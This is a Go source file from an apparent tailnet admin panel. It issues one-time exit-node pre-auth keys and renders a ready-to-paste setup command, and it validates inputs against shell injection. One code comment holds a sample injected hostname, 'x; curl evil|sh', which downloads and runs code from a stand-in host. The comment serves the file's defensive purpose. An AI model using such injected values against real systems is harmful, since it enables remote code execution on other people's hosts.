// File: internal/feature/admin/exit_node_register.go
//
// B266 (2026-09-19) — "Зарегистрировать новый exit node" из панели.
//
// ЗАЧЕМ
//
// До B266 завести новый exit node можно было только руками: полезть в
// headscale за preauth-ключом (или на /admin/tailscale, который выдаёт
// ключ для САМОГО skygate-хоста), поставить Tailscale на VPS, включить
// ip_forward/NAT, поднять `tailscale up --advertise-exit-node`, потом
// вернуться в панель и нажать «Tag as exit-node». Шаг с ключом был
// главным камнем преткновения: ни одна страница не выдавала ключ,
// привязанный к `tag:exit-node`, а именно этот тег требует
// tagOwners-владельца `infra@<baseDomain>` — то есть ключ обязан
// принадлежать техническому пользователю `infra`, иначе headscale
// отклонит тег.
//
// B266 закрывает ровно этот шаг + даёт оператору готовую команду для
// VPS (с уже подставленным ключом), а также предупреждает о двух
// ловушках, которые на живой VM уже стреляли:
//
//  1. hostname, который уже занят другим узлом tailnet — headscale
//     зарегистрирует ВТОРОЙ узел с тем же именем (на VM так появились
//     `skygate-host-1` и `skygate-host-1-1`), и потом непонятно, какой
//     из них настоящий;
//  2. ключ нельзя переиспользовать в другом месте — он одноразовый по
//     умолчанию, и его нельзя показывать дважды (в БД он не хранится).
//
// ЧЕГО ЗДЕСЬ СОЗНАТЕЛЬНО НЕТ
//
// B266 НЕ принимает и НЕ хранит приватный SSH-ключ. Полный сценарий
// «передай ключ и адрес, панель сама всё поставит» требует V073
// (зашифрованная колонка `exit_servers.ssh_key_enc`), нового скрипта
// провижининга в контейнере и закрытия argv-инъекции в
// internal/headscale/routes.go. Это отдельный блок; B266 решает
// 80% боли (ключ + точная команда + предупреждения) без хранения
// секретов и без нового attack surface.

package admin

import (
	"fmt"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"

	"skygate/internal/db"
	"skygate/internal/headscale"
)

// exitNodeKeySettingPrefix is the global_settings key prefix under
// which the freshly minted pre-auth key is parked for exactly ONE page
// render. The value never goes into the redirect URL (keys in URLs end
// up in access logs, browser history and Referer headers) — the redirect
// carries only an opaque token, and AdminExitNodes consumes + deletes
// the row.
const exitNodeKeySettingPrefix = "exitnode.register_key."

// exitNodeRegisterMaxTTL bounds the pre-auth key lifetime the operator
// can request. A pre-auth key is a root-equivalent credential for the
// tailnet: an unbounded or very long one that leaks is a permanent
// backdoor, and the whole point of this flow is that the operator
// registers the node within minutes.
const exitNodeRegisterMaxTTL = 24 * time.Hour

// exitNodeRegisterView is what AdminExitNodes renders after a successful
// registration. Exported for the template.
type ExitNodeRegisterView struct {
	// Hostname / Key / Command are shown once, then gone.
	Hostname string
	Key      string
	Command  string
	// MgmtKey is the path skygate's management public key was read from (B310);
	// empty when it could not be read, in which case the page tells the operator
	// to copy it by hand — a command with a placeholder would grant nothing.
	MgmtKey string
	// Warnings are non-fatal hazards detected before minting the key.
	Warnings []string
}

// exitNodeRegisterCommand builds the exact `tailscale up` invocation the
// operator must run ON THE NEW HOST, with the freshly minted key and the
// canonical exit-node flags already filled in.
//
// B310 (2026-09-23): `mgmtPubKey` is skygate's OWN ssh public key. It is written
// into the new relay's authorized_keys in the same paste, so the relay is
// manageable from the first sync — over the tailnet, which is the path that keeps
// working when the provider blocks or withdraws the public address. Passing an
// empty key keeps the pre-B310 command shape (the operator copies the key by hand).
//
// Pure function (unit-testable): no headscale, no DB, no filesystem.
func exitNodeRegisterCommand(loginServer, key, hostname, mgmtPubKey string) string {
	loginServer = strings.TrimSpace(loginServer)
	if loginServer == "" {
		loginServer = "https://head.example.com"
	}
	var b strings.Builder
	b.WriteString("# 1. на новой машине (root): установить Tailscale\n")
	b.WriteString("curl -fsSL https://tailscale.com/install.sh | sh\n\n")
	b.WriteString("# 2. включить forwarding + NAT (иначе exit node не проксирует)\n")
	b.WriteString("echo 'net.ipv4.ip_forward=1' >> /etc/sysctl.d/99-tailscale.conf\n")
	b.WriteString("echo 'net.ipv6.conf.all.forwarding=1' >> /etc/sysctl.d/99-tailscale.conf\n")
	b.WriteString("sysctl -p /etc/sysctl.d/99-tailscale.conf\n\n")
	if hostname != "" {
		b.WriteString("# 3. имя узла в tailnet (должно быть уникальным!)\n")
		b.WriteString("hostnamectl set-hostname " + hostname + "\n\n")
	}
	b.WriteString("# 4. подключить узел: ключ уже с тегом tag:exit-node (владелец infra@)\n")
	b.WriteString("tailscale up \\\n")
	b.WriteString("  --login-server=" + loginServer + " \\\n")
	b.WriteString("  --authkey=" + key + " \\\n")
	b.WriteString("  --hostname=" + firstNonEmptyStr(hostname, "<уникальное-имя>") + " \\\n")
	b.WriteString("  --advertise-exit-node --accept-routes --ssh\n\n")
	if step := exitNodeAuthorizedKeyStep(mgmtPubKey); step != "" {
		b.WriteString("# 5. разрешить skygate управлять этим узлом по SSH (его публичный ключ)\n")
		b.WriteString("#    так управление идёт по tailnet и переживает блокировку публичного IP\n")
		b.WriteString(step)
		b.WriteString("\n")
	}
	next := "5"
	if strings.TrimSpace(mgmtPubKey) != "" && isSSHPublicKey(strings.TrimSpace(mgmtPubKey)) {
		next = "6"
	}
	b.WriteString("# " + next + ". вернуться сюда и нажать «Re-sync» в строке узла:\n")
	b.WriteString("#    skygate сам выставит --advertise-routes и одобрит 0.0.0.0/0 + ::/0\n")
	return b.String()
}

// isSSHPublicKey reports whether s is an OpenSSH public key line (the only shape
// that may be written into another host's authorized_keys by this flow).
func isSSHPublicKey(s string) bool {
	for _, prefix := range []string{"ssh-ed25519 ", "ssh-rsa ", "ecdsa-sha2-", "sk-ssh-ed25519@openssh.com ", "sk-ecdsa-sha2-"} {
		if strings.HasPrefix(s, prefix) {
			return true
		}
	}
	return false
}

// exitNodeAuthorizedKeyStep renders the authorized_keys lines for skygate's own key
// (B310). It refuses anything that is not a plain OpenSSH public key line, and it
// strips characters that would break out of the shell quoting — the value comes from
// a file on this host, but it is rendered into a command the operator pastes into a
// root shell, so the same gate the node name gets applies here.
func exitNodeAuthorizedKeyStep(pubKey string) string {
	k := sanitizeSSHPublicKey(pubKey)
	if k == "" || !isSSHPublicKey(k) {
		return ""
	}
	return "mkdir -p /root/.ssh && chmod 700 /root/.ssh\n" +
		"grep -qF '" + k + "' /root/.ssh/authorized_keys 2>/dev/null || echo '" + k + "' >> /root/.ssh/authorized_keys\n" +
		"chmod 600 /root/.ssh/authorized_keys\n"
}

// sanitizeSSHPublicKey returns the key line when it is safe to render, else "".
func sanitizeSSHPublicKey(pubKey string) string {
	k := strings.TrimSpace(pubKey)
	if k == "" || strings.ContainsAny(k, "\n\r'\"`\\$;&|<>") {
		return ""
	}
	if len(k) > 500 {
		return ""
	}
	return k
}

// PostAdminExitNodeRegister mints a `tag:exit-node` pre-auth key owned by
// the technical `infra` user and renders the ready-to-run command.
//
// Admin-only. Audited (the key itself is NOT written to the audit log —
// only its hostname and a fingerprint-length marker).
func (s *Service) PostAdminExitNodeRegister(w http.ResponseWriter, r *http.Request) {
	c := s.Backend.CurrentUser(r)
	if c == nil || !c.IsAdmin {
		http.Error(w, "forbidden", http.StatusForbidden)
		return
	}
	hostname := strings.TrimSpace(r.FormValue("hostname"))
	if hostname == "" {
		http.Redirect(w, r, "/admin/exit-nodes?err="+url.QueryEscape(
			s.I18n.T(s.I18n.LangFromRequest(r), "exit_nodes.register_err_hostname")), http.StatusSeeOther)
		return
	}
	// The node name is used verbatim in a shell command shown to the
	// operator AND becomes the tailnet hostname, so restrict it to the
	// charset headscale/mDNS actually accept. Without this a value like
	// "x; curl evil|sh" would be rendered into the copy-paste block.
	if !isSafeNodeName(hostname) {
		http.Redirect(w, r, "/admin/exit-nodes?err="+url.QueryEscape(
			s.I18n.T(s.I18n.LangFromRequest(r), "exit_nodes.register_err_hostname_charset")), http.StatusSeeOther)
		return
	}
	ttl := exitNodeRegisterMaxTTL
	if v := strings.TrimSpace(r.FormValue("ttl")); v != "" {
		if d, err := time.ParseDuration(v); err == nil && d > 0 {
			if d > exitNodeRegisterMaxTTL {
				d = exitNodeRegisterMaxTTL
			}
			ttl = d
		}
	}

	hs := s.HSGlobalFn()
	if hs == nil {
		http.Redirect(w, r, "/admin/exit-nodes?err="+url.QueryEscape("headscale client unavailable"), http.StatusSeeOther)
		return
	}

	// Non-fatal hazards, collected BEFORE we mint anything so the
	// operator sees them next to the key (and can decide to abort).
	var warnings []string
	if nodes, err := hs.ListAllNodes(); err == nil {
		lower := strings.ToLower(hostname)
		for _, n := range nodes {
			if strings.ToLower(n.Hostname) == lower || strings.ToLower(n.GivenName) == lower {
				warnings = append(warnings, fmt.Sprintf(
					"имя %q уже занято узлом id=%s (user=%s) — headscale создаст ВТОРОЙ узел с тем же именем; выберите другое имя или сначала удалите старый узел",
					hostname, n.ID, n.UserName))
				break
			}
		}
	}
	if rows, err := db.ListExitServers(s.dbc()); err == nil {
		for _, e := range rows {
			if strings.EqualFold(e.Hostname, hostname) {
				warnings = append(warnings, fmt.Sprintf(
					"в exit_servers уже есть строка %q (node_id=%s) — возможно, узел уже зарегистрирован; строка будет переиспользована",
					e.Hostname, e.NodeID))
				break
			}
		}
	}

	// The pre-auth key MUST belong to `infra`: the generated ACL declares
	// tagOwners tag:exit-node = ["infra@<baseDomain>"] (acl.go), and
	// headscale rejects a tagged key whose user does not own the tag.
	infraID, err := s.infraHeadscaleUserID(r.Context())
	if err != nil {
		s.Backend.Audit(c.UserID, c.Username, "exit_node_register",
			fmt.Sprintf("hostname=%s err=infra_lookup %v", hostname, err))
		http.Redirect(w, r, "/admin/exit-nodes?err="+url.QueryEscape(
			"пользователь infra не найден в headscale — сначала выполните ensureInfraUser (перезапуск skygate): "+err.Error()), http.StatusSeeOther)
		return
	}
	pk, err := hs.CreatePreauthKeyWithTags(infraID, ttl.String(), false, []string{"tag:exit-node"})
	if err != nil {
		s.Backend.Audit(c.UserID, c.Username, "exit_node_register",
			fmt.Sprintf("hostname=%s infra_id=%d err=preauth %v", hostname, infraID, err))
		http.Redirect(w, r, "/admin/exit-nodes?err="+url.QueryEscape(
			"не удалось выдать preauth-ключ: "+err.Error()), http.StatusSeeOther)
		return
	}

	// Park the key for exactly one render. Never in the URL.
	token, terr := db.RandomConfirmationToken(16)
	if terr != nil {
		http.Redirect(w, r, "/admin/exit-nodes?err="+url.QueryEscape("token: "+terr.Error()), http.StatusSeeOther)
		return
	}
	payload := hostname + "\x1f" + pk.Key
	if serr := db.SetGlobalSetting(s.dbc(), exitNodeKeySettingPrefix+token, payload); serr != nil {
		http.Redirect(w, r, "/admin/exit-nodes?err="+url.QueryEscape("сохранить ключ: "+serr.Error()), http.StatusSeeOther)
		return
	}
	// A key that is never rendered (operator closed the tab) must not
	// linger in global_settings.
	s.scheduleExitNodeKeySweep(token)

	s.Backend.Audit(c.UserID, c.Username, "exit_node_register",
		fmt.Sprintf("hostname=%s infra_id=%d ttl=%s key_len=%d warnings=%d (key not logged)",
			hostname, infraID, ttl, len(pk.Key), len(warnings)))
	http.Redirect(w, r, "/admin/exit-nodes?registered="+url.QueryEscape(token), http.StatusSeeOther)
}

// consumeExitNodeRegisterKey reads + DELETES the parked key for `token`.
// Returns nil when the token is unknown/expired (the page then renders
// nothing — the key is shown exactly once by design).
func (s *Service) consumeExitNodeRegisterKey(token string) *ExitNodeRegisterView {
	token = strings.TrimSpace(token)
	if token == "" {
		return nil
	}
	// Defensive: the token becomes part of a global_settings key.
	for _, r := range token {
		if !(r >= 'a' && r <= 'z' || r >= 'A' && r <= 'Z' || r >= '0' && r <= '9' || r == '-' || r == '_') {
			return nil
		}
	}
	key := exitNodeKeySettingPrefix + token
	v, err := db.GetGlobalSetting(s.dbc(), key, "")
	if err != nil || v == "" {
		return nil
	}
	_ = db.SetGlobalSetting(s.dbc(), key, "")
	parts := strings.SplitN(v, "\x1f", 2)
	if len(parts) != 2 {
		return nil
	}
	return &ExitNodeRegisterView{
		Hostname: parts[0],
		Key:      parts[1],
		Command:  exitNodeRegisterCommand(s.controlURL(), parts[1], parts[0], s.managementSSHPublicKey()),
		MgmtKey:  s.managementSSHPublicKeyPath(),
	}
}

// managementSSHPublicKey returns skygate's own ssh public key — the credential a
// new exit node has to trust for skygate to manage it (B310).
//
// The private key file is the one the route sync already uses; its .pub sibling is
// what belongs in authorized_keys. Both the configured path and the deployed
// defaults are probed, because a native install and the container keep the key in
// different places. Empty means "not readable", and the page then says to copy it
// by hand — better than rendering a command with a placeholder that silently
// grants nothing.
func (s *Service) managementSSHPublicKey() string {
	_, key := s.managementSSHPublicKeyPair()
	return key
}

// managementSSHPublicKeyPath names WHERE the key was read from (rendered next to
// the command so the operator can verify it).
func (s *Service) managementSSHPublicKeyPath() string {
	path, _ := s.managementSSHPublicKeyPair()
	return path
}

func (s *Service) managementSSHPublicKeyPair() (path, key string) {
	var cands []string
	if s.Cfg != nil {
		if p := strings.TrimSpace(s.Cfg.SSHKeyPath); p != "" {
			cands = append(cands, p+".pub")
		}
	}
	cands = append(cands,
		headscale.ContainerDefaultSSHKey+".pub",
		"/ssh-sync/id_ed25519.pub",
		"/ssh-sync/skygate_sync.pub", // the deployed sync key on the reference agent VM
	)
	for _, p := range cands {
		b, err := os.ReadFile(p)
		if err != nil {
			continue
		}
		if k := sanitizeSSHPublicKey(string(b)); k != "" && isSSHPublicKey(k) {
			return p, k
		}
	}
	return "", ""
}

// scheduleExitNodeKeySweep clears a parked key after 15 minutes even if
// the page was never rendered. Best-effort: a failure just leaves a
// short-lived row behind.
func (s *Service) scheduleExitNodeKeySweep(token string) {
	go func() {
		time.Sleep(15 * time.Minute)
		_ = db.SetGlobalSetting(s.dbc(), exitNodeKeySettingPrefix+token, "")
	}()
}

// controlURL is the login-server URL the new node must dial. Prefers the
// operator's configured value (SKYGATE_TS_LOGIN_SERVER) and falls back to
// the headscale public URL.
func (s *Service) controlURL() string {
	if v := strings.TrimSpace(os.Getenv("SKYGATE_TS_LOGIN_SERVER")); v != "" {
		return v
	}
	return strings.TrimSpace(os.Getenv("HEADSCALE_SERVER_URL"))
}

// isSafeNodeName accepts the charset headscale/mDNS accept for a node
// name: letters, digits, dot, dash, underscore; 1..63 chars; no leading
// dash (would be parsed as a flag by the shell/tools). Pure function.
func isSafeNodeName(s string) bool {
	if s == "" || len(s) > 63 {
		return false
	}
	if s[0] == '-' || s[0] == '.' {
		return false
	}
	for _, r := range s {
		switch {
		case r >= 'a' && r <= 'z':
		case r >= 'A' && r <= 'Z':
		case r >= '0' && r <= '9':
		case r == '-' || r == '_' || r == '.':
		default:
			return false
		}
	}
	return true
}
